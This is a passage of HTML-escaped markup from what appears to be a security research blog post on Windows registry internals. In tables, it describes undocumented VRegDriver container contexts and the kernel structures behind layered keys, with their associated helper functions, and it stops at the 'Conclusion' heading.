href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;blog post #4&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This enabled the creation of a proof-of-concept exploit for a differencing hive vulnerability (&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451625&quot;&gt;CVE-2023-36404&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), demonstrating the ability to load custom hives and, consequently, expose the flaw.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Silo context&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This silo-specific context structure is set by the VRegDriver during silo initialization using the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psinsertpermanentsilocontext&quot;&gt;PsInsertPermanentSiloContext&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is later retrieved by &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psgetpermanentsilocontext&quot;&gt;PsGetPermanentSiloContext&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and used during both IOCTL handling and path translation for containerized processes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A brief analysis suggests that it primarily contains the GUID of the associated silo, a push lock used for synchronization, and a user-configured list of namespaces for the given container, which is a set of source and target paths between which redirection should occur.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Key context&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This structure stores the context specific to a particular key being subject to path translation within a silo.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is usually allocated for each key opened within the context of a containerized process, and assigned to its key body using the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmsetcallbackobjectcontext&quot;&gt;CmSetCallbackObjectContext&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. It primarily stores the original path of the key before translation&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;&amp;mdash;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;as the client believes it has access to&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;&amp;mdash;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and several other auxiliary fields.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Callback context (open/create)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The callback-specific context structure stores shared data between &amp;quot;pre&amp;quot; and &amp;quot;post&amp;quot; callbacks for a given operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This context is generally accessed through the CallContext field within the REG_&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;_INFORMATION structure relevant to the specific operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, VRegDriver only has one instance of a special structure defined for this purpose, used when handling the RegNtPreCreateKeyEx/RegNtPreOpenKeyEx callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It saves specific data (RootObject, CompleteName, RemainingName) before the open/create request, to restore their original values in the &amp;quot;post&amp;quot; callback.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Extra parameter&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This structure also appears to be used for temporarily storing the original key path during translation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However, i&lt;/span&gt;&lt;span&gt;ts scope encompasses the entire key creation/opening process, rather than just a single callback.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means it can store information across callbacks, even when symbolic links or write-through hives are encountered during path traversal, causing the CmpParseKey function to return STATUS_REPARSE or STATUS_REPARSE_GLOBAL and restart the path lookup process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Although the concept of a &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;whole operation context&lt;/span&gt;&lt;span&gt;&amp;nbsp;seems broadly applicable, currently there is only one type of &amp;quot;extra parameter&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;being used&lt;/span&gt;&lt;span&gt;, represented by the GUID VRP_ORIGINAL_KEY_NAME_PARAMETER_GUID {85b8669a-cfbb-4ac0-b689-6daabfe57722}.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;tTszyzmaCA-c31 tTszyzmaCA-c13&quot; id=&quot;h.2gdxwyxd7lj8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Layered keys&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c5 tTszyzmaCA-c7 tTszyzmaCA-c24&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_KCB_LAYER_INFO&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This is likely the only structure related to layered keys whose definition is public.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is part of every KCB and contains information about the placement of the key in the global, &lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span&gt;vertical&amp;quot; tree of layered key instances.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, this means that it stores a pointer to the KCB at one level lower (its parent, so to speak), and the head of a linked list with KCBs at one level higher (KCB.LayerHeight+1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;), if any exist.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Key node stack&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;A stack containing all instances of a given layered key, starting from its level all the way down to level zero (the base key).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Each key in this structure is represented by a (Hive,&amp;nbsp;KeyCell) pair.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If the key actually exists at a given level (KeyCell &amp;ne; -1, indicating a state other than Merge-Unbacked), it is also represented by a direct, resolved pointer to its _CM_KEY_NODE structure.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Since Windows 10 introduced support for layered keys, many places in the code that previously identified a single key as _CM_KEY_NODE&lt;/span&gt;&lt;span&gt;* &lt;/span&gt;&lt;span&gt;now require passing the entire key node stack structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is because operations on layered keys usually require knowledge of the state of lower level keys (e.g. their layered semantics, subkeys, values), not just the key represented by the handle used by the caller.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Places where the key node stack structure is used can be identified by calls to its related helper functions, such as those for initialization (CmpInitializeKeyNodeStack) and cleanup (CmpCleanupKeyNodeStack), as well as any others containing the string &amp;quot;KeyNodeStack&amp;quot;.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;KCB stack&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This structure, analogous to the key node stack, represents keys using KCBs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Its use is most clearly revealed by references to the CmpStartKcbStack and CmpStartKcbStackForTopLayerKcb functions in code, though many other internal routines with &amp;quot;KcbStack&amp;quot; in their names also operate on it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Both the KCB stack and the key node stack share an optimization where the first two levels are stored inline, with additional levels allocated in kernel pools only when necessary.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is likely due to the fact that most systems, even those with layered keys, typically only use one level of nesting (two levels total).&lt;/span&gt;&lt;span&gt;&amp;nbsp;Thus, this &lt;/span&gt;&lt;span&gt;optimization avoids costly memory allocation and deallocation in these common scenarios.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Enum stack&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This data structure allows for the enumeration of subkeys within a given layered key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Its primary use is within the CmpEnumerateLayeredKey function, which serves as the handler for the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwenumeratekey&quot;&gt;NtEnumerateKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;operation specifically for layered keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;At an even higher level, this corresponds to the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumkeyexw&quot;&gt;RegEnumKeyExW&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API function.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The complexity of this structure is evident by the fact that there are 19 internal helper functions, all starting with the name CmpKeyEnumStack, that operate on it.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Enum resume context&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This data structure, directly tied to the subkey enumeration, primarily serves as an optimization mechanism.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;After executing a specific number (N) of enumeration steps, it stores the internal state of the enum stack.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This allows subsequent requests for subkey N+1 to resume the enumeration process from the previous point, bypassing the need to repeat the initial steps.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Linked to a specific handle, it is stored within _CM_KEY_BODY.EnumerationResumeContext.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The KCB.SequenceNumber field, directly related to this structure, monitors whether a given key has significantly changed since a previous point in time.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This enables the CmpKeyEnumStackVerifyResumeContext helper function to determine if the current registry state is consistent enough for the existing enumeration resume context to be used for further enumeration, or if the entire process needs to be restarted.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Value enum stack&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This data structure, used to enumerate values for layered keys, is similarly complex as those used to list subkeys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The main function utilizing it is CmEnumerateValueFromLayeredKey.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, there are 10 helper functions named CmpValueEnumStack[...] that operate on this structure.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Sorted value enum stack&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The structure is similar to the standard value enum stack, but is used to iterate over the values of a given layered key while preserving lexicographical order.&lt;/span&gt;&lt;span&gt;&amp;nbsp;H&lt;/span&gt;&lt;span&gt;elper functions from the CmpSortedValueEnumStack[...] family (9 in total) correspond to this structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This functionality is used exclusively in the CmpGetValueCountForKeyNodeStack function, which is responsible for returning the number of values for a given key.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The reason for the existence of this mechanism in parallel with the regular &amp;quot;value enum stack&amp;quot; is not entirely clea&lt;/span&gt;&lt;span&gt;r, but &lt;/span&gt;&lt;span&gt;I suspect it serves as an optimization for value counting operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is supported by the fact that while layered keys first appeared in Windows 10 1607 (Redstone, build 14393), the sorted value enum stack was not introduced until the later version of Windows 10 1703 (Redstone 2, build 15063).&lt;/span&gt;&lt;span&gt;&amp;nbsp;In the first iteration of the layered key implementation&lt;/span&gt;&lt;span&gt;, CmpGetValueCountForKeyNodeStack was implemented using the standard value enum stack.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This lends credibility to the hypothesis that these mechanisms are functionally equivalent, but the &amp;quot;sorted&amp;quot; version is faster at counting unique values when direct access to them is not required.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Subtree enumerator&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This structure enables the enumeration of both the direct subkeys of a layered key and all its deeper descendants.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is relatively complex, and its associated functions begin with CmpSubtreeEnumerator[...] (also 9 in total).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This mechanism is primarily needed to implement the &amp;quot;rename&amp;quot; operation on layered keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;First, it allows verification that the caller has KEY_READ and DELETE permissions for all descendant keys in the subtree&lt;/span&gt;&lt;span&gt;, and s&lt;/span&gt;&lt;span&gt;econd, it enables setting the LayerSemantics value for these descendants to Supersede-Tree (0x3).&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Discard/replace context&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;This data structure is employed during key deletion to ensure that KCB structures corresponding to higher-level Merge-Unbacked keys reliant on the deleted key are also marked as deleted.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Subsequently, &amp;quot;fresh&amp;quot; KCB objects representing the non-existent key are inserted into the tree in their place.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The two primary functions associated with this mechanism are CmpPrepareDiscardAndReplaceKcbAndUnbackedHigherLayers and CmpCommitDiscardAndReplaceKcbAndUnbackedHigherLayers.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=&quot;tTszyzmaCA-c40 tTszyzmaCA-c13&quot; id=&quot;h.cwf4b0u8kd8p&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c58 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;
